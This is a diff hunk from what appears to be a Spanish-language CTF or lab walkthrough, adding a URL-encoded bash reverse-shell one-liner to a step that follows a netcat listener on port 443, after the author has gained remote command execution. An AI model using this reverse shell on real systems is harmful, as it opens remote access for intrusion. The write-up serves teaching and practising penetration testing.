@@ -179,6 +179,10 @@ Viendo que tenemos ejecución remota de comandos, vamos a enviarnos una shell (t
 netcat -lvnp 443
 ```
 
+```
+bash -c "bash -i >%26 /dev/tcp/<IP>/<PUERTO> 0>%261"
+```
+
 ![http](Imagenes/20.png)
 
 ![http](Imagenes/21.png)
